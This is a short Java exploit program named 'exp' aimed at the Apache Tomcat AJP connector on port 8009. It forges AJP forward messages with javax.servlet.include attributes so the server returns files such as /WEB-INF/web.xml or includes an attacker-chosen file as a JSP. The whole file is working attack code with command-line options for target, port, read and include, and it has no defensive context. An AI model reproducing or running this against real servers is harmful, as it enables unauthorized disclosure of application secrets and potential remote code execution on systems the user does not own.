import ajp.SimpleAjpClient;
import ajp.TesterAjpMessage;
import org.apache.commons.cli.*;

public class exp {
    public static void main(String[] args) throws Exception {

        CommandLineParser parser = new BasicParser();
        Options options = new Options();

        options.addOption("t","target",true,"help info");
        options.addOption("p","port",false,"file output");
        options.addOption("i","include",true,"file output");
        options.addOption("r","read",true,"file output");

        CommandLine cmd = parser.parse(options,args);

        String host = cmd.getOptionValue("t", "127.0.0.1");
        String port = cmd.getOptionValue("p","8009");

        String file = "/WEB-INF/web.xml";
//        String file = "/1.jsp";
        TesterAjpMessage forwardMessage;
        String uri = "/xxx";

        if(cmd.hasOption("i")){
            file = cmd.getOptionValue("i");
            uri = "/xxx.jsp";
        }

        if(cmd.hasOption("r")){
            file = cmd.getOptionValue("r");
        }

        SimpleAjpClient ac = new SimpleAjpClient();
        ac.connect(host,Integer.parseInt(port));

        forwardMessage = ac.createForwardMessage(uri);
        forwardMessage.addHeadInfo();
        forwardMessage.addAttr("javax.servlet.include.request_uri", "1");
        forwardMessage.addAttr("javax.servlet.include.path_info", "");
        forwardMessage.addAttr("javax.servlet.include.servlet_path", file);
        forwardMessage.end();

        ac.sendMessage(forwardMessage);
        TesterAjpMessage responseBody = ac.readMessage();

        System.out.println(responseBody.readString());

        ac.disconnect();
    }
}
